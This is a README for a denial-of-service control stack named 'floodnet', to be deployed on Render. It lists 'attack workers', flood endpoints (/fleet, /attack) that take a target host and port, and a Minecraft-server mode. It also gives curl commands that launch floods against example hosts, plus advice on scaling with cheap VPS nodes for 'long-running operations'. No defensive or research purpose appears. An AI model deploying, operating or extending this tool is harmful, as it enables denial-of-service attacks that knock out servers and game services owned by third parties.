# Fleet control stack

The app runs as one service and serves the dashboard from the service URL itself. It also launches the attack workers locally, so there is no registry service, no heartbeat, and no `REGISTRY` environment variable to set.

## File tree

```text
.
├── README.md
├── render.yaml
├── .gitignore
├── fold.py
├── ui/
│   └── index.html
└── __pycache__/
```

## Environment variables

| Name | Required | Purpose |
| --- | --- | --- |
| TOKEN | Yes | Shared secret used for requests when enabled. |
| PROCS | No | Number of worker processes spawned by the local agent. Default 2. |
| THREADS | No | Number of threads per dripper worker. Default 32. |
| PORT | No | HTTP port for the service. Default 8000. |
| NODE_ID | No | Optional node name override; otherwise the Render service name is used. |

## Endpoints

| Method | Path | Result |
| --- | --- | --- |
| GET | / | Dashboard HTML. |
| GET | /ui | Dashboard HTML. |
| GET | /status | JSON status for the current node. |
| GET | /nodes | JSON list containing this service as the single node. |
| GET | /fleet?host=&port=&procs=&threads=&mc=1 | Starts the local attack and returns `{"fired": 1}`. |
| GET | /attack?host=&port=&procs=&threads=&mc=1 | Alias for `/fleet`. |
| GET | /stop | Stops the current running load. Returns `{"ok": true}`. |

## Deploy on Render

1. Create a new Render web service from this repository.
2. Use the `render.yaml` file in the repo as the Blueprint.
3. Deploy the service.
4. Open the public URL for the service to view the dashboard.

Example:

```text
https://floodnet.onrender.com/
```

## Bookmark the dashboard with a token

You can prefill both the URL and token with a query string:

```text
https://floodnet.onrender.com/?r=https://floodnet.onrender.com&k=shared-secret
```

The dashboard stores the registry URL, token, target, and form values in `localStorage`.

## Fire from curl

```bash
curl "https://floodnet.onrender.com/fleet?k=shared-secret&host=example.com&port=80&procs=2&threads=32"
curl "https://floodnet.onrender.com/fleet?k=shared-secret&host=play.mcserver.net&port=25565&procs=2&threads=32&mc=1"
```

## Sizing note

Free Render instances are 0.1 vCPU and have 4 source IPs. The 750-hour monthly cap supports a single low-cost service, but not a large multi-node fleet. For long-running operations, a few cheap VPS nodes are more reliable than a large number of free instances.

## Adding more nodes later

This is optional. If you want to expand later, you can deploy the same service on another host and point the dashboard at that service URL, but the single-service setup is the default and easiest option.
